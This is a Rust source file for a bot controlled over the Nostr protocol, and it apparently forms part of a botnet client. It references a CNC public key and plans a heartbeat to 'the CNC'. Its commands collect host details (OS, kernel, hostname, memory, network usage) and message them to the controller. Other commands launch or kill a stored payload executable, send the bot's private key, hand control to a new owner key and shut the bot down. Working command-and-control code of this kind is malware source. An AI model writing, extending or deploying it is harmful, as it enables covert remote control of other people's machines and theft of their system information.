use crate::bot::state::State;
use nostr_sdk::prelude::*;

pub enum Commands {
    HelloWorld(HelloWorldCommand),
    Disable(DisableCommand),
    Enable(EnabledCommand),
    PrivateKey(RequestPrivateKeyCommand),
    Help(HelpCommand),
    Sysinfo(SysInfoCommand),
    Kill(KillCommand),
    ChangeOwner(ChangeOwnerCommand),
    // TODO:
    // set_owner
    // SwitchRelay
    // HeartBeat : periodically send a health message to the CNC
}

pub type CommandResult = Result<String>;

impl Commands {
    pub fn parse(command: &str) -> Option<Self> {
        let parts: Vec<&str> = command.split_whitespace().collect();
        if parts.is_empty() || parts[0].len() <= 1 || !parts[0].starts_with('/') {
            return None;
        }

        let command_str = &parts[0][1..];
        let args = &parts[1..];
        match command_str {
            "hello" => Some(Commands::HelloWorld(HelloWorldCommand {})),
            "disable" => Some(Commands::Disable(DisableCommand {})),
            "enable" => Some(Commands::Enable(EnabledCommand {})),
            "private_key" => Some(Commands::PrivateKey(RequestPrivateKeyCommand {})),
            "help" => Some(Commands::Help(HelpCommand {})),
            "info" => Some(Commands::Sysinfo(SysInfoCommand {})),
            "kill" => Some(Commands::Kill(KillCommand {})),
            "owner" => Some(Commands::ChangeOwner(
                ChangeOwnerCommand::new(args.get(0).map(|arg| arg.to_string())).ok()?,
            )),
            _ => None,
        }
    }

    pub async fn execute(
        &self,
        state: &mut State,
        session: &Session,
        pubkey: PublicKey,
    ) -> Result<()> {
        match self {
            Commands::HelloWorld(cmd) => cmd.execute(state, session, pubkey).await,
            Commands::Disable(cmd) => cmd.execute(state, session, pubkey).await,
            Commands::Enable(cmd) => cmd.execute(state, session, pubkey).await,
            Commands::PrivateKey(cmd) => cmd.execute(state, session, pubkey).await,
            Commands::Help(cmd) => cmd.execute(state, session, pubkey).await,
            Commands::Sysinfo(cmd) => cmd.execute(state, session, pubkey).await,
            Commands::Kill(cmd) => cmd.execute(state, session, pubkey).await,
            Commands::ChangeOwner(cmd) => cmd.execute(state, session, pubkey).await,
        }
    }
}

use crate::{CNC_PUB_KEY, session::Session};

pub trait Command {
    fn execute(
        &self,
        state: &mut State,
        session: &Session,
        pubkey: PublicKey,
    ) -> impl Future<Output = Result<()>>;
}

pub struct SysInfoCommand {}

fn format_size(size: u64) -> String {
    const UNITS: [&str; 6] = ["B", "kB", "MB", "GB", "TB", "PB"];
    let mut size = size as f64;
    let mut unit = 0;

    while size >= 1024.0 && unit < UNITS.len() - 1 {
        size /= 1024.0;
        unit += 1;
    }

    format!("{:.2} {}", size, UNITS[unit])
}

impl Command for SysInfoCommand {
    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
        use sysinfo::{Networks, System};
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut content = String::new();
        content.push_str(&format!("=> system:\n"));
        content.push_str(&format!(
            "total memory: {}\n",
            format_size(sys.total_memory())
        ));
        content.push_str(&format!(
            "used memory : {}\n",
            format_size(sys.used_memory())
        ));
        content.push_str(&format!(
            "total swap  : {}\n",
            format_size(sys.total_swap())
        ));
        content.push_str(&format!("used swap   : {}\n", format_size(sys.used_swap())));

        if let Some(name) = System::name() {
            content.push_str(&format!("System name:             {}\n", name));
        }
        if let Some(kernel_version) = System::kernel_version() {
            content.push_str(&format!("System kernel version:   {}\n", kernel_version));
        }
        if let Some(os_version) = System::os_version() {
            content.push_str(&format!("System OS version:       {}\n", os_version));
        }
        if let Some(host_name) = System::host_name() {
            content.push_str(&format!("System host name:        {}\n", host_name));
        }

        content.push_str(&format!("NB CPUs: {}\n", sys.cpus().len()));

        let networks = Networks::new_with_refreshed_list();
        content.push_str("=> networks:\n");
        for (interface_name, data) in &networks {
            content.push_str(&format!(
                "{interface_name}: {} (down) / {} (up)\n",
                format_size(data.total_received()),
                format_size(data.total_transmitted()),
            ));
        }

        session.send_msg(&content, pubkey).await?;

        Ok(())
    }
}

pub struct HelloWorldCommand {}

impl Command for HelloWorldCommand {
    async fn execute(
        &self,
        _state: &mut State,
        session: &Session,
        pubkey: PublicKey,
    ) -> Result<()> {
        session.send_msg("Hello World!", pubkey).await?;
        Ok(())
    }
}

pub struct DisableCommand {}

impl Command for DisableCommand {
    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
        state.enabled = false;
        if let Some(ref mut child) = state.child {
            child.kill()?;
            state.child = None;
        }
        session.update_metadata(state.to_string().as_str()).await?;
        session.send_msg("I'm disabled", pubkey).await?;
        Ok(())
    }
}

pub struct EnabledCommand {}

impl Command for EnabledCommand {
    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
        state.enabled = true;
        if let Some(child) = &mut state.child {
            child.kill()?;
            state.child = None;
        }
        if let Some(ref path_buf) = state.payload {
            state.child = Some(session.run_executable(path_buf));
        }
        session.update_metadata(state.to_string().as_str()).await?;
        session.send_msg("I'm enabled", pubkey).await?;

        Ok(())
    }
}

pub struct RequestPrivateKeyCommand {}

impl Command for RequestPrivateKeyCommand {
    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
        let private_key = session.keys.secret_key().to_bech32()?;
        session
            .send_msg(&format!("This is my private key: {}", private_key), pubkey)
            .await?;
        Ok(())
    }
}

pub struct KillCommand {}

impl Command for KillCommand {
    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
        if let Some(ref mut child) = state.child {
            child.kill()?;
            state.child = None;
        }
        state.enabled = false;
        session.update_metadata(state.to_string().as_str()).await?;
        session.send_msg("Shutting down...", pubkey).await?;
        std::process::exit(0);
    }
}

pub struct ChangeOwnerCommand {
    npub: Option<PublicKey>,
}

impl ChangeOwnerCommand {
    pub fn new(npub_str: Option<String>) -> Result<Self> {
        let npub = match npub_str {
            Some(npub_str) => Some(PublicKey::parse(&npub_str)?),
            None => None,
        };
        Ok(ChangeOwnerCommand { npub })
    }
}

impl Command for ChangeOwnerCommand {
    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
        state.owner = self.npub;
        session
            .send_msg("Owner changed successfully.", pubkey)
            .await?;
        if let Some(npub) = self.npub {
            session
                .send_msg("You gained access to this bot.", npub)
                .await?;
        }
        Ok(())
    }
}

pub struct HelpCommand {}

impl Command for HelpCommand {
    async fn execute(
        &self,
        _state: &mut State,
        session: &Session,
        pubkey: PublicKey,
    ) -> Result<()> {
        session
            .send_msg(
                "Available commands:
                    /help : Display this help message
                    /hello : Say hello
                    /disable : Disable the bot
                    /enable : Enable the bot
                    /info : Display system information
                    /kill : Terminate the bot
                    /owner <pubkey> : Change the owner of the bot (leave empty to remove owner)
                ",
                pubkey,
            )
            .await?;
        Ok(())
    }
}
